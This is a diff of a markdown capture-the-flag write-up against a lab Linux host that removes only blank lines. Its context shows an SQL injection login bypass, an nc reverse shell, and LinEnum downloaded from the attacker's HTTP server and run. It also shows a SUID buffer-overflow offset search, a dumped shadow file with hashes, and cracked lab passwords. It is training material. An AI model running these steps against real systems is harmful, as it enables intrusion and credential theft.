@@ -373,8 +373,6 @@ Table: users
 
 [*] ending @ 22:05:02 /2022-12-26/
 
-
-
 ```
 
 What is the admin username?  
@@ -385,14 +383,11 @@ It is a login *form*
 
 What is the admin password?  
 
-
 *secretpass*
 
 How many forms of SQLI is the form vulnerable to?
 
 *3*
-
-![[Pasted image 20221226220752.png]]
 
 ### Command Execution
 
@@ -429,7 +424,6 @@ Ncat: Listening on 0.0.0.0:1337
 Ncat: Connection from 10.10.181.221.
 Ncat: Connection from 10.10.181.221:37076.
 /bin/sh: 0: can't access tty; job control turned off
-
 
 ┌──(kali㉿kali)-[~]
 └─$ rlwrap nc -lnvp 1337
@@ -547,7 +541,6 @@ drwxrwxrwx 6 pingu pingu 4.0K Jan 20  2020 ..
 -rwxrwxrwx 1 pingu pingu 1.7K Jan 15  2020 id_rsa
 -rwxrwxrwx 1 pingu pingu  394 Jan 15  2020 id_rsa.pub
 
-
 www-data@ubuntu:/home/pingu/.ssh$ cat id_rsa
 cat id_rsa
 -----BEGIN RSA PRIVATE KEY-----
@@ -654,7 +647,6 @@ find / -name pass* 2>/dev/null
 /boot/grub/i386-pc/password.mod
 /boot/grub/i386-pc/password_pbkdf2.mod
 
-
 www-data@ubuntu:/home/pingu/.ssh$ cd /var/hidden
 cd /var/hidden
 www-data@ubuntu:/var/hidden$ ls
@@ -681,7 +673,6 @@ pingu
 
 :)
 
-
 ```
 
 How many files are in the current directory?  
@@ -697,7 +688,6 @@ Check /etc/passwd
 What is my ssh password?
 
 *pinguapingu*
-
 
 ### LinEnum
 
@@ -731,7 +721,6 @@ Answer the questions below
 └─$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
-
 pingu@ubuntu:~$ cd /tmp
 pingu@ubuntu:/tmp$ ls
 p  systemd-private-8858506f7bd24cd1a414a769c3dfc612-systemd-timesyncd.service-oolTiU  VMwareDnD
@@ -746,13 +735,10 @@ LinEnum.sh                  100%[=========================================>]  45
 
 2022-12-26 19:30:10 (68.7 KB/s) - ‘LinEnum.sh’ saved [46631/46631]
 
-
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.181.221 - - [26/Dec/2022 22:30:09] "GET /LinEnum.sh HTTP/1.1" 200 -
-
-
 
 pingu@ubuntu:/tmp$ chmod +x LinEnum.sh;./LinEnum.sh
 
@@ -765,7 +751,6 @@ pingu@ubuntu:/tmp$ chmod +x LinEnum.sh;./LinEnum.sh
 [-] Debug Info
 [+] Thorough tests = Disabled
 
-
 Scan started at:
 Mon Dec 26 19:30:30 PST 2022                                                                                  
                                                                                                               
@@ -774,10 +759,8 @@ Mon Dec 26 19:30:30 PST 2022
 [-] Kernel information:
 Linux ubuntu 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 
-
 [-] Kernel information (continued):
 Linux version 4.4.0-142-generic (buildd@lgw01-amd64-033) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.10) ) #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019
-
 
 [-] Specific release information:
 DISTRIB_ID=Ubuntu
@@ -796,15 +779,12 @@ BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
 VERSION_CODENAME=xenial
 UBUNTU_CODENAME=xenial
 
-
 [-] Hostname:
 ubuntu
-
 
 ### USER/GROUP ##########################################
 [-] Current user/group info:
 uid=1002(pingu) gid=1002(pingu) groups=1002(pingu),4(adm),24(cdrom),27(sudo),30(dip)
-
 
 [-] Users that have previously logged onto the system:
 Username         Port     From             Latest
@@ -812,12 +792,10 @@ root             tty1                      Thu Jan 16 21:09:47 -0800 2020
 papa             tty1                      Thu Jan 16 20:15:17 -0800 2020
 pingu            pts/1    10.8.19.103      Mon Dec 26 19:26:47 -0800 2022
 
-
 [-] Who else is logged on:
  19:30:30 up  1:59,  1 user,  load average: 0.06, 0.02, 0.00
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 pingu    pts/1    10.8.19.103      19:26    6.00s  0.02s  0.00s /bin/bash ./LinEnum.sh
-
 
 [-] Group memberships:
 uid=0(root) gid=0(root) groups=0(root)
@@ -851,12 +829,10 @@ uid=108(mysql) gid=116(mysql) groups=116(mysql)
 uid=109(sshd) gid=65534(nogroup) groups=65534(nogroup)
 uid=1002(pingu) gid=1002(pingu) groups=1002(pingu),4(adm),24(cdrom),27(sudo),30(dip)
 
-
 [-] It looks like we have some admin users:
 uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
 uid=1000(papa) gid=1000(papa) groups=1000(papa),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
 uid=1002(pingu) gid=1002(pingu) groups=1002(pingu),4(adm),24(cdrom),27(sudo),30(dip)
-
 
 [-] Contents of /etc/passwd:
 root:x:0:0:root:/root:/bin/bash
@@ -890,14 +866,11 @@ mysql:x:108:116:MySQL Server,,,:/nonexistent:/bin/false
 sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
 pingu:x:1002:1002::/home/pingu:/bin/bash
 
-
 [-] Super user account(s):
 root
 
-
 [-] Accounts that have recently used sudo:
 /home/papa/.sudo_as_admin_successful
-
 
 [-] Are permissions on /home directories lax:
 total 16K
@@ -905,7 +878,6 @@ drwxr-xr-x  4 root  root  4.0K Jan 15  2020 .
 drwxr-xr-x 24 root  root  4.0K Jan 15  2020 ..
 drwxr-xr-x  5 papa  papa  4.0K Jan 15  2020 papa
 drwxrwxrwx  6 pingu pingu 4.0K Jan 20  2020 pingu
-
 
 ### ENVIRONMENTAL #######################################
 [-] Environment information:
@@ -927,7 +899,6 @@ SSH_CONNECTION=10.8.19.103 53272 10.10.181.221 22
 XDG_RUNTIME_DIR=/run/user/1002
 _=/usr/bin/env
 
-
 [-] Path information:
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
 drwxr-xr-x 2 root root  4096 Jan 15  2020 /bin
@@ -939,7 +910,6 @@ drwxr-xr-x 2 root root  4096 Feb 26  2019 /usr/local/games
 drwxr-xr-x 2 root root  4096 Feb 26  2019 /usr/local/sbin
 drwxr-xr-x 2 root root  4096 Jan 15  2020 /usr/sbin
 
-
 [-] Available shells:
 # /etc/shells: valid login shells
 /bin/sh
@@ -948,22 +918,18 @@ drwxr-xr-x 2 root root  4096 Jan 15  2020 /usr/sbin
 /bin/rbash
 /usr/bin/tmux
 
-
 [-] Current umask value:
 0002
 u=rwx,g=rwx,o=rx
 
-
 [-] umask value as specified in /etc/login.defs:
 UMASK           022
-
 
 [-] Password and storage information:
 PASS_MAX_DAYS   99999
 PASS_MIN_DAYS   0
 PASS_WARN_AGE   7
 ENCRYPT_METHOD SHA512
-
 
 ### JOBS/TASKS ##########################################
 [-] Cron jobs:
@@ -1012,7 +978,6 @@ drwxr-xr-x 92 root root 4096 Jan 20  2020 ..
 -rwxr-xr-x  1 root root  771 Nov  6  2015 man-db
 -rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
 
-
 [-] Crontab contents:
 # /etc/crontab: system-wide crontab
 # Unlike any other crontab you don't have to run the `crontab'
@@ -1030,7 +995,6 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
 #
 
-
 [-] Systemd timers:
 NEXT                         LEFT     LAST                         PASSED       UNIT                         ACTIVATES
 Tue 2022-12-27 06:12:09 PST  10h left Mon 2022-12-26 17:31:02 PST  1h 59min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
@@ -1039,7 +1003,6 @@ Tue 2022-12-27 17:45:47 PST  22h left Mon 2022-12-26 17:45:47 PST  1h 44min ago 
 
 3 timers listed.
 Enable thorough tests to see inactive timers
-
 
 ### NETWORKING  ##########################################
 [-] Network and IP info:
@@ -1061,18 +1024,14 @@ lo        Link encap:Local Loopback
           collisions:0 txqueuelen:1 
           RX bytes:117896 (117.8 KB)  TX bytes:117896 (117.8 KB)
 
-
 [-] ARP history:
 ip-10-10-0-1.eu-west-1.compute.internal (10.10.0.1) at 02:c8:85:b5:5a:aa [ether] on eth0
-
 
 [-] Nameserver(s):
 nameserver 10.0.0.2
 
-
 [-] Default route:
 default         ip-10-10-0-1.eu 0.0.0.0         UG    0      0        0 eth0
-
 
 [-] Listening TCP:
 Active Internet connections (only servers)
@@ -1082,12 +1041,10 @@ tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      
 tcp6       0      0 :::80                   :::*                    LISTEN      -               
 tcp6       0      0 :::22                   :::*                    LISTEN      -               
 
-
 [-] Listening UDP:
 Active Internet connections (only servers)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
-
 
 ### SERVICES #############################################
 [-] Running processes:
@@ -1198,7 +1155,6 @@ pingu     1361  0.0  0.1   7296   664 pts/1    S+   19:30   0:00 tee -a
 pingu     1549  0.0  0.5  13536  2772 pts/1    S+   19:30   0:00 /bin/bash ./LinEnum.sh
 pingu     1550  0.0  0.6  37364  3296 pts/1    R+   19:30   0:00 ps aux
 
-
 [-] Process binaries and associated permissions (from above list):
 1016K -rwxr-xr-x 1 root root 1014K May 16  2017 /bin/bash
     0 lrwxrwxrwx 1 root root     4 Jan 15  2020 /bin/sh -> dash
@@ -1217,7 +1173,6 @@ pingu     1550  0.0  0.6  37364  3296 pts/1    R+   19:30   0:00 ps aux
   24M -rwxr-xr-x 1 root root   24M Nov 15  2019 /usr/sbin/mysqld
  588K -rwxr-xr-x 1 root root  586K Apr  5  2016 /usr/sbin/rsyslogd
  776K -rwxr-xr-x 1 root root  773K Mar  4  2019 /usr/sbin/sshd
-
 
 [-] /etc/init.d/ binary permissions:
 total 264
@@ -1278,7 +1233,6 @@ drwxr-xr-x 92 root root 4096 Jan 20  2020 ..
 -rwxr-xr-x  1 root root 1306 May 16  2018 uuidd
 -rwxr-xr-x  1 root root 2757 Jan 19  2017 x11-common
 
-
 [-] /etc/init/ config file permissions:
 total 132
 drwxr-xr-x  2 root root 4096 Jan 15  2020 .
@@ -1314,7 +1268,6 @@ drwxr-xr-x 92 root root 4096 Jan 20  2020 ..
 -rw-r--r--  1 root root  473 Aug  7  2014 ufw.conf
 -rw-r--r--  1 root root  889 Feb 24  2015 ureadahead.conf
 -rw-r--r--  1 root root  683 Feb 24  2015 ureadahead-other.conf
-
 
 [-] /lib/systemd/* config file permissions:
 /lib/systemd/:
@@ -1796,15 +1749,12 @@ total 12K
 /lib/systemd/system-shutdown:
 total 0
 
-
 ### SOFTWARE #############################################
 [-] Sudo version:
 Sudo version 1.8.16
 
-
 [-] MYSQL version:
 mysql  Ver 14.14 Distrib 5.7.28, for Linux (x86_64) using  EditLine wrapper
-
 
 [+] We can connect to the local MYSQL service with default root/root credentials!
 mysqladmin  Ver 8.42 Distrib 5.7.28, for Linux on x86_64
@@ -1822,16 +1772,13 @@ Uptime:                 1 hour 59 min 23 sec
 
 Threads: 1  Questions: 932  Slow queries: 0  Opens: 128  Flush tables: 1  Open tables: 45  Queries per second avg: 0.130
 
-
 [-] Apache version:
 Server version: Apache/2.4.18 (Ubuntu)
 Server built:   2019-10-08T13:31:25
 
-
 [-] Apache user configuration:
 APACHE_RUN_USER=www-data
 APACHE_RUN_GROUP=www-data
-
 
 [-] Installed Apache modules:
 Loaded Modules:
@@ -1863,14 +1810,12 @@ Loaded Modules:
  setenvif_module (shared)
  status_module (shared)
 
-
 ### INTERESTING FILES ####################################
 [-] Useful file locations:
 /bin/nc
 /bin/netcat
 /usr/bin/wget
 /usr/bin/gcc
-
 
 [-] Installed compilers:
 ii  g++                                 4:5.3.1-1ubuntu1                           amd64        GNU C++ compiler
@@ -1882,13 +1827,11 @@ ii  gcc-multilib                        4:5.3.1-1ubuntu1                        
 ii  libllvm6.0:amd64                    1:6.0-1ubuntu2~16.04.1                     amd64        Modular compiler and toolchain technologies, runtime library
 ii  libxkbcommon0:amd64                 0.5.0-1ubuntu2.1                           amd64        library interface to the XKB compiler - shared library
 
-
 [-] Can we read/write sensitive files:
 -rw-r--r-- 1 root root 1556 Jan 16  2020 /etc/passwd
 -rw-r--r-- 1 root root 825 Jan 15  2020 /etc/group
 -rw-r--r-- 1 root root 575 Oct 22  2015 /etc/profile
 -rw-r----- 1 root shadow 1072 Jan 15  2020 /etc/shadow
-
 
 [-] SUID files:
 -r-sr-xr-x 1 root papa 7516 Jan 16  2020 /opt/secret/root
@@ -1910,7 +1853,6 @@ ii  libxkbcommon0:amd64                 0.5.0-1ubuntu2.1                        
 -rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
 -rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
 
-
 [-] SGID files:
 -rwxr-sr-x 1 root ssh 358624 Mar  4  2019 /usr/bin/ssh-agent
 -rwxr-sr-x 1 root shadow 22768 May 16  2017 /usr/bin/expiry
@@ -1923,12 +1865,10 @@ ii  libxkbcommon0:amd64                 0.5.0-1ubuntu2.1                        
 -rwxr-sr-x 1 root shadow 35632 Apr  9  2018 /sbin/pam_extrausers_chkpwd
 -rwxr-sr-x 1 root shadow 35600 Apr  9  2018 /sbin/unix_chkpwd
 
-
 [+] Files with POSIX capabilities set:
 /usr/bin/mtr = cap_net_raw+ep
 /usr/bin/traceroute6.iputils = cap_net_raw+ep
 /usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
-
 
 [-] Can't search *.conf files as no keyword was entered
 
@@ -1963,34 +1903,27 @@ ii  libxkbcommon0:amd64                 0.5.0-1ubuntu2.1                        
 -rw-r--r-- 1 root root 14867 Apr 11  2016 /etc/ltrace.conf
 -rw-r--r-- 1 root root 1260 Mar 16  2016 /etc/ucf.conf
 
-
 [-] Current user's history files:
 lrwxrwxrwx 1 pingu pingu    9 Jan 20  2020 /home/pingu/.bash_history -> /dev/null
 -rw------- 1 pingu pingu 1852 Jan 20  2020 /home/pingu/.gdb_history
-
 
 [-] Location and contents (if accessible) of .bash_history file(s):
 /home/papa/.bash_history
 /home/pingu/.bash_history
 
-
 [-] Location and Permissions (if accessible) of .bak file(s):
 -rw-r--r-- 1 root root 3020 Jan 15  2020 /etc/apt/sources.bak
 -rw-r----- 1 papa papa 895 Jan 15  2020 /var/backups/shadow.bak
-
 
 [-] Any interesting mail in /var/mail:
 total 8
 drwxrwsr-x  2 root mail 4096 Feb 26  2019 .
 drwxr-xr-x 13 root root 4096 Jan 15  2020 ..
 
-
 ### SCAN COMPLETE ####################################
-
 
 [-] SUID files:
 -r-sr-xr-x 1 root papa 7516 Jan 16  2020 /opt/secret/root
-
 
 ```
 
@@ -2192,7 +2125,6 @@ and
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (44)
 zsh: segmentation fault  ./root
 
-
 ┌──(kali㉿kali)-[~/bufferoverflow/penguin]
 └─$ ./root
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (43)
@@ -2239,7 +2171,6 @@ Segmentation fault
 
 It works :)
 
-
 let's do through 
 
 pingu@ubuntu:/opt/secret$ gdb /opt/secret/root
@@ -2283,15 +2214,6 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 ──────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────
 Invalid address 0x6161616c
 
-
-
-
-
-
-
-
-
-
 ──────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────
 00:0000│ esp  0xffb7cb40 ◂— 0xf700616d /* 'ma' */
 01:0004│      0xffb7cb44 —▸ 0xffb7cb60 ◂— 0x1
@@ -2307,13 +2229,10 @@ Invalid address 0x6161616c
 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────
 Program received signal SIGSEGV (fault address 0x6161616c)
 
-
 pwndbg> cyclic -l 0x6161616c
 44
 
-
 in my way
-
 
 ┌──(kali㉿kali)-[~]
 └─$ python3
@@ -2324,9 +2243,6 @@ Type "help", "copyright", "credits" or "license" for more information.
 b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama'
 >>> 'a'*50
 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
-
-
-
 
 ┌──(kali㉿kali)-[~/bufferoverflow/penguin]
 └─$ gdb root
@@ -2373,15 +2289,6 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 ──────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────────
 Invalid address 0x6161616c
 
-
-
-
-
-
-
-
-
-
 ──────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────
 00:0000│ esp 0xffffcf40 ◂— 0x616d /* 'ma' */
 01:0004│     0xffffcf44 —▸ 0xffffcf60 ◂— 0x1
@@ -2399,9 +2306,6 @@ Invalid address 0x6161616c
 pwndbg> cyclic -l 0x6161616c
 Lookup value: b'laaa'
 44
-
-
-
 
 ```
 
@@ -2479,7 +2383,6 @@ messagebus:*:18277:0:99999:7:::
 uuidd:*:18277:0:99999:7:::
 papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::
 Segmentation fault
-
 
 ```
 
@@ -2603,7 +2506,6 @@ uuidd:*:18277:0:99999:7:::
 papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::
 [*] Got EOF while reading in interactive
 
-
 ```
 
 ### Finishing the job
@@ -2725,7 +2627,6 @@ love2fish
 
 ```
 
-
 What is the root password!
 
 *love2fish*
@@ -2747,7 +2648,5 @@ Further reading:
 Answer the questions below
 
 You helped me out!
-
-
 
 [[Neighbour]]
